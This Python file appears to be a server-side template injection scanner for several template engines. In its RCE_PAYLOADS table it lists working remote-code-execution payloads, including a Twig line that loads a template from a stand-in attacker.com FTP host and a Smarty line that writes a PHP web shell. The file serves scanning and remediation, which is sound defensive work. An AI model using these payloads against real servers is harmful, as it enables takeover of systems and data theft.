from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import re
from collections import defaultdict
import threading
import time
import hashlib


class SSTIType(Enum):
    JINJA2 = "jinja2"
    TWIG = "twig"
    FREEMARKER = "freemarker"
    VELOCITY = "velocity"
    THYMELEAF = "thymeleaf"
    SMARTY = "smarty"
    MAKO = "mako"
    ERB = "erb"
    HANDLEBARS = "handlebars"
    PEBBLE = "pebble"
    EXPRESSION_LANGUAGE = "expression_language"


class TemplateEngine(Enum):
    PYTHON_JINJA2 = "python_jinja2"
    PYTHON_MAKO = "python_mako"
    PHP_TWIG = "php_twig"
    PHP_SMARTY = "php_smarty"
    JAVA_FREEMARKER = "java_freemarker"
    JAVA_VELOCITY = "java_velocity"
    JAVA_THYMELEAF = "java_thymeleaf"
    RUBY_ERB = "ruby_erb"
    NODEJS_HANDLEBARS = "nodejs_handlebars"
    UNKNOWN = "unknown"


class PayloadContext(Enum):
    TEXT = "text"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    HTML = "html"
    URL = "url"


@dataclass
class SSTIPayload:
    payload: str
    ssti_type: SSTIType
    template_engine: TemplateEngine
    context: PayloadContext
    expected_output: str
    severity: str = "Critical"
    detection_patterns: List[str] = field(default_factory=list)
    requires_confirmation: bool = True
    false_positive_risk: float = 0.15


@dataclass
class SSTIVulnerability:
    vulnerability_type: str
    ssti_type: SSTIType
    template_engine: TemplateEngine
    url: str
    parameter: str
    payload: str
    severity: str
    evidence: str
    response_time: float
    expected_output: str
    actual_output: str
    code_executed: bool = False
    command_output: Optional[str] = None
    template_detected: Optional[str] = None
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    timestamp: float = field(default_factory=time.time)


class TemplateEngineDetector:
    ENGINE_SIGNATURES = {
        TemplateEngine.PYTHON_JINJA2: [
            r'jinja2\.',
            r'{% .* %}',
            r'{{ .* }}',
            r'jinja2\.exceptions',
        ],
        TemplateEngine.PYTHON_MAKO: [
            r'<%.*%>',
            r'${.*}',
            r'mako\.',
        ],
        TemplateEngine.PHP_TWIG: [
            r'{% .* %}',
            r'{{ .* }}',
            r'Twig\\',
        ],
        TemplateEngine.PHP_SMARTY: [
            r'\{.*\}',
            r'Smarty',
        ],
        TemplateEngine.JAVA_FREEMARKER: [
            r'<#.*>',
            r'\${.*}',
            r'freemarker\.',
        ],
        TemplateEngine.JAVA_VELOCITY: [
            r'#set',
            r'\$\{.*\}',
            r'velocity',
        ],
        TemplateEngine.RUBY_ERB: [
            r'<%=.*%>',
            r'<%.*%>',
        ],
    }
    
    @staticmethod
    def detect_template_engine(response_content: str, error_messages: str) -> Optional[TemplateEngine]:
        combined_content = response_content + error_messages
        
        for engine, signatures in TemplateEngineDetector.ENGINE_SIGNATURES.items():
            for signature in signatures:
                if re.search(signature, combined_content, re.IGNORECASE):
                    return engine
        
        return TemplateEngine.UNKNOWN
    
    @staticmethod
    def detect_from_headers(response_headers: Dict) -> Optional[TemplateEngine]:
        server_header = response_headers.get('Server', '').lower()
        x_powered_by = response_headers.get('X-Powered-By', '').lower()
        
        combined = server_header + x_powered_by
        
        if 'flask' in combined or 'jinja' in combined:
            return TemplateEngine.PYTHON_JINJA2
        elif 'django' in combined:
            return TemplateEngine.PYTHON_JINJA2
        elif 'php' in combined:
            return TemplateEngine.PHP_TWIG
        elif 'java' in combined:
            return TemplateEngine.JAVA_FREEMARKER
        elif 'ruby' in combined:
            return TemplateEngine.RUBY_ERB
        
        return None


class SSTIPayloadGenerator:
    DETECTION_PAYLOADS = {
        SSTIType.JINJA2: [
            ('{{7*7}}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('{{config}}', 'Config'),
            ('{{self}}', '<'),
            ('{% for x in range(7) %}7{% endfor %}', '7777777'),
        ],
        SSTIType.TWIG: [
            ('{{7*7}}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('{{_self}}', 'Twig'),
            ('{{dump(app)}}', 'dump'),
        ],
        SSTIType.FREEMARKER: [
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            ('${7*\'7\'}', '49'),
            ('<#assign x=7*7>${x}', '49'),
        ],
        SSTIType.VELOCITY: [
            ('${{7*7}}', '49'),
            ('#set($x=7*7)$x', '49'),
            ('$class.inspect', 'class'),
        ],
        SSTIType.SMARTY: [
            ('{7*7}', '49'),
            ('{php}echo 7*7;{/php}', '49'),
            ('{$smarty.version}', '.'),
        ],
        SSTIType.MAKO: [
            ('${7*7}', '49'),
            ('<%=7*7%>', '49'),
            ('${self}', 'mako'),
        ],
        SSTIType.ERB: [
            ('<%=7*7%>', '49'),
            ('<%= 7 * 7 %>', '49'),
            ('<%=`ls`%>', 'total'),
        ],
        SSTIType.EXPRESSION_LANGUAGE: [
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            ('${{7*7}}', '49'),
        ],
    }
    
    RCE_PAYLOADS = {
        SSTIType.JINJA2: [
            "{{''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
            "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{% endfor %}",
        ],
        SSTIType.TWIG: [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('ls')}}",
            "{{_self.env.setCache('ftp://attacker.com:2121')}}{{_self.env.loadTemplate('backdoor')}}",
        ],
        SSTIType.FREEMARKER: [
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls") }',
            '<#assign classloader=object?api.class.protectionDomain.classLoader>',
        ],
        SSTIType.VELOCITY: [
            '#set($e="e");$e.class.forName("java.lang.Runtime").getRuntime().exec("ls")',
            '#set($x=$class.inspect("java.lang.Runtime").type.getRuntime())$x.exec("ls")',
        ],
        SSTIType.SMARTY: [
            '{php}system("ls");{/php}',
            '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[cmd]); ?>",self::clearConfig)}',
        ],
        SSTIType.MAKO: [
            "<%import os;os.system('ls')%>",
            "${self.module.cache.util.os.system('ls')}",
        ],
        SSTIType.ERB: [
            "<%=`ls`%>",
            "<%=system('ls')%>",
            "<%= IO.popen('ls').read %>",
        ],
    }
    
    @staticmethod
    def generate_detection_payloads(ssti_type: SSTIType) -> List[Tuple[str, str]]:
        return SSTIPayloadGenerator.DETECTION_PAYLOADS.get(ssti_type, [])
    
    @staticmethod
    def generate_rce_payloads(ssti_type: SSTIType) -> List[str]:
        return SSTIPayloadGenerator.RCE_PAYLOADS.get(ssti_type, [])
    
    @staticmethod
    def generate_polyglot_payload() -> str:
        return "{{7*7}}[{7*7}]${7*7}<#assign x=7*7>${x}#{7*7}<%=7*7%>"


class ResponseAnalyzer:
    @staticmethod
    def analyze_response(response_content: str, payload: str, expected_output: str) -> Tuple[bool, float, str]:
        if expected_output in response_content:
            confidence = 0.95
            evidence = f"Expected output '{expected_output}' found in response"
            return True, confidence, evidence
        
        math_result_patterns = [
            r'\b49\b',
            r'\b7777777\b',
            r'\b343\b',
        ]
        
        for pattern in math_result_patterns:
            if re.search(pattern, response_content):
                confidence = 0.85
                evidence = f"Mathematical computation result found: {pattern}"
                return True, confidence, evidence
        
        if len(response_content) > len(payload) * 2:
            confidence = 0.6
            evidence = "Response size significantly increased after payload injection"
            return True, confidence, evidence
        
        return False, 0.0, ""
    
    @staticmethod
    def extract_execution_output(response_content: str, payload: str) -> Optional[str]:
        if 'total' in response_content.lower() and 'drwx' in response_content:
            lines = response_content.split('\n')
            output_lines = [line for line in lines if 'drwx' in line or '-rw' in line]
            return '\n'.join(output_lines[:10])
        
        if 'uid=' in response_content and 'gid=' in response_content:
            match = re.search(r'uid=\d+.*gid=\d+.*', response_content)
            if match:
                return match.group(0)
        
        return None


class ErrorMessageAnalyzer:
    ERROR_PATTERNS = {
        'jinja2': [
            r'jinja2\.exceptions',
            r'TemplateSyntaxError',
            r'UndefinedError',
        ],
        'twig': [
            r'Twig\\Error',
            r'Twig_Error',
        ],
        'freemarker': [
            r'freemarker\.core',
            r'TemplateException',
        ],
        'velocity': [
            r'org\.apache\.velocity',
            r'ParseException',
        ],
        'smarty': [
            r'Smarty error',
            r'Smarty_Internal',
        ],
    }
    
    @staticmethod
    def analyze_errors(response_content: str) -> Tuple[bool, Optional[str], List[str]]:
        errors_found = []
        detected_engine = None
        
        for engine, patterns in ErrorMessageAnalyzer.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response_content, re.IGNORECASE):
                    errors_found.append(pattern)
                    if not detected_engine:
                        detected_engine = engine
        
        return len(errors_found) > 0, detected_engine, errors_found


class ContextAnalyzer:
    @staticmethod
    def detect_injection_context(response_content: str, payload: str) -> PayloadContext:
        if payload not in response_content:
            return PayloadContext.TEXT
        
        idx = response_content.find(payload)
        context_before = response_content[max(0, idx-50):idx]
        context_after = response_content[idx+len(payload):idx+len(payload)+50]
        
        if re.search(r'<[^>]*$', context_before) and re.search(r'^[^<]*>', context_after):
            return PayloadContext.ATTRIBUTE
        
        if '<script' in context_before.lower() or '</script' in context_after.lower():
            return PayloadContext.JAVASCRIPT
        
        if 'href=' in context_before or 'src=' in context_before:
            return PayloadContext.URL
        
        if '<' in context_before or '>' in context_after:
            return PayloadContext.HTML
        
        return PayloadContext.TEXT


class SSTIScanner:
    def __init__(self):
        self.engine_detector = TemplateEngineDetector()
        self.payload_generator = SSTIPayloadGenerator()
        self.response_analyzer = ResponseAnalyzer()
        self.error_analyzer = ErrorMessageAnalyzer()
        self.context_analyzer = ContextAnalyzer()
        
        self.vulnerabilities: List[SSTIVulnerability] = []
        self.scan_statistics = defaultdict(int)
        self.lock = threading.Lock()
    
    def scan(self, target_url: str, response: Dict, payloads: Optional[List[str]] = None) -> List[SSTIVulnerability]:
        vulnerabilities = []
        response_content = response.get('content', '')
        response_time = response.get('response_time', 0)
        status_code = response.get('status_code', 0)
        response_headers = response.get('headers', {})
        
        parameter = self._extract_parameter_name(target_url)
        
        template_engine = self.engine_detector.detect_template_engine(response_content, '')
        if not template_engine or template_engine == TemplateEngine.UNKNOWN:
            template_engine = self.engine_detector.detect_from_headers(response_headers)
        
        ssti_types_to_test = self._determine_ssti_types_to_test(template_engine)
        
        for ssti_type in ssti_types_to_test:
            detection_payloads = self.payload_generator.generate_detection_payloads(ssti_type)
            
            for payload, expected_output in detection_payloads:
                is_vulnerable, confidence, evidence = self.response_analyzer.analyze_response(
                    response_content,
                    payload,
                    expected_output
                )
                
                if is_vulnerable:
                    context = self.context_analyzer.detect_injection_context(response_content, payload)
                    
                    vuln = SSTIVulnerability(
                        vulnerability_type='Server-Side Template Injection',
                        ssti_type=ssti_type,
                        template_engine=template_engine or TemplateEngine.UNKNOWN,
                        url=target_url,
                        parameter=parameter,
                        payload=payload,
                        severity='Critical',
                        evidence=evidence,
                        response_time=response_time,
                        expected_output=expected_output,
                        actual_output=response_content[:200],
                        template_detected=template_engine.value if template_engine else None,
                        confirmed=confidence > 0.8,
                        confidence_score=confidence,
                        remediation=self._get_remediation()
                    )
                    
                    if self._is_valid_vulnerability(vuln):
                        vulnerabilities.append(vuln)
                        self.scan_statistics[ssti_type.value] += 1
            
            rce_payloads = self.payload_generator.generate_rce_payloads(ssti_type)
            
            for rce_payload in rce_payloads[:2]:
                command_output = self.response_analyzer.extract_execution_output(response_content, rce_payload)
                
                if command_output:
                    vuln = SSTIVulnerability(
                        vulnerability_type='Server-Side Template Injection',
                        ssti_type=ssti_type,
                        template_engine=template_engine or TemplateEngine.UNKNOWN,
                        url=target_url,
                        parameter=parameter,
                        payload=rce_payload,
                        severity='Critical',
                        evidence='Remote code execution confirmed',
                        response_time=response_time,
                        expected_output='command_output',
                        actual_output=command_output,
                        code_executed=True,
                        command_output=command_output,
                        confirmed=True,
                        confidence_score=0.98,
                        remediation=self._get_remediation()
                    )
                    vulnerabilities.append(vuln)
                    self.scan_statistics['rce_confirmed'] += 1
        
        has_errors, error_engine, error_messages = self.error_analyzer.analyze_errors(response_content)
        if has_errors:
            vuln = SSTIVulnerability(
                vulnerability_type='Server-Side Template Injection',
                ssti_type=SSTIType.JINJA2,
                template_engine=TemplateEngine.UNKNOWN,
                url=target_url,
                parameter=parameter,
                payload='error_based',
                severity='High',
                evidence=f'Template engine errors detected: {", ".join(error_messages[:3])}',
                response_time=response_time,
                expected_output='error',
                actual_output='; '.join(error_messages),
                template_detected=error_engine,
                confirmed=True,
                confidence_score=0.75,
                remediation=self._get_remediation()
            )
            vulnerabilities.append(vuln)
            self.scan_statistics['error_based'] += 1
        
        with self.lock:
            self.vulnerabilities.extend(vulnerabilities)
        
        return vulnerabilities
    
    def _determine_ssti_types_to_test(self, template_engine: Optional[TemplateEngine]) -> List[SSTIType]:
        if not template_engine or template_engine == TemplateEngine.UNKNOWN:
            return list(SSTIType)
        
        engine_to_ssti = {
            TemplateEngine.PYTHON_JINJA2: [SSTIType.JINJA2],
            TemplateEngine.PYTHON_MAKO: [SSTIType.MAKO],
            TemplateEngine.PHP_TWIG: [SSTIType.TWIG],
            TemplateEngine.PHP_SMARTY: [SSTIType.SMARTY],
            TemplateEngine.JAVA_FREEMARKER: [SSTIType.FREEMARKER],
            TemplateEngine.JAVA_VELOCITY: [SSTIType.VELOCITY],
            TemplateEngine.RUBY_ERB: [SSTIType.ERB],
        }
        
        return engine_to_ssti.get(template_engine, list(SSTIType))
    
    def _extract_parameter_name(self, url: str) -> str:
        from urllib.parse import urlparse, parse_qs
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())[0] if params else 'parameter'
    
    def _is_valid_vulnerability(self, vuln: SSTIVulnerability) -> bool:
        if vuln.confidence_score < 0.6:
            return False
        
        if any(word in vuln.payload.lower() for word in ['test', 'debug', 'sample']):
            return False
        
        return vuln.confirmed or vuln.code_executed
    
    def _get_remediation(self) -> str:
        return (
            "Use safe templating methods (sandboxed environments). "
            "Avoid passing user input directly to template engines. "
            "Implement strict input validation. "
            "Use template engines with auto-escaping enabled. "
            "Disable dangerous template functions. "
            "Use logic-less template engines when possible. "
            "Implement Content Security Policy headers. "
            "Run template rendering in isolated environments. "
            "Regularly update template engine libraries. "
            "Monitor for template injection attempts."
        )
    
    def get_vulnerabilities(self) -> List[SSTIVulnerability]:
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_statistics(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.scan_statistics)
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.scan_statistics.clear()